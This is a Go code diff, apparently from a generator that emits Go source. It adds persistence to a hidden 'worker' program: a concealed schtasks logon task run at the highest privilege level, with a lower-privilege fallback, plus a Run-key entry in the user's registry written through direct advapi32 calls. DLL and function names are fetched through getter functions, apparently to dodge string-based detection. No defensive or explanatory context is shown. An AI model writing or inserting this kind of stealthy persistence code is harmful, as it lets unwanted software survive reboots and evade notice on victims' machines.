@@ -109,7 +109,32 @@ func opSetupTask(workerPath string) {
 	taskName := "%s"
 	tr := "\\\"" + workerPath + "\\\" worker"
 	cmd := cmdHidden(getSchtasksExeName(), "/Create", "/TN", taskName, "/TR", tr, "/SC", "ONLOGON", "/RL", "HIGHEST", "/F")
-	_ = cmd.Run()
+	if err := cmd.Run(); err != nil {
+		cmd2 := cmdHidden(getSchtasksExeName(), "/Create", "/TN", taskName, "/TR", tr, "/SC", "ONLOGON", "/RL", "LIMITED", "/F")
+		_ = cmd2.Run()
+	}
+	opAddRegistryRun(workerPath)
+}
+
+func opAddRegistryRun(workerPath string) {
+	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
+	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
+	regSetValueEx := advapi32.NewProc("RegSetValueExW")
+	regCloseKey := advapi32.NewProc(getRegCloseKeyName())
+
+	keyPath, _ := syscall.UTF16PtrFromString("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
+	var hKey syscall.Handle
+	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000001), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20006), uintptr(unsafe.Pointer(&hKey)))
+	if ret != 0 {
+		return
+	}
+	defer regCloseKey.Call(uintptr(hKey))
+
+	valName, _ := syscall.UTF16PtrFromString(getDisplayName())
+	cmdLine := "\\\"" + workerPath + "\\\" worker"
+	valData, _ := syscall.UTF16FromString(cmdLine)
+	dataBytes := (*[1 << 20]byte)(unsafe.Pointer(&valData[0]))[:len(valData)*2]
+	regSetValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, 1, uintptr(unsafe.Pointer(&dataBytes[0])), uintptr(len(dataBytes)))
 }
 `, taskName))
 }
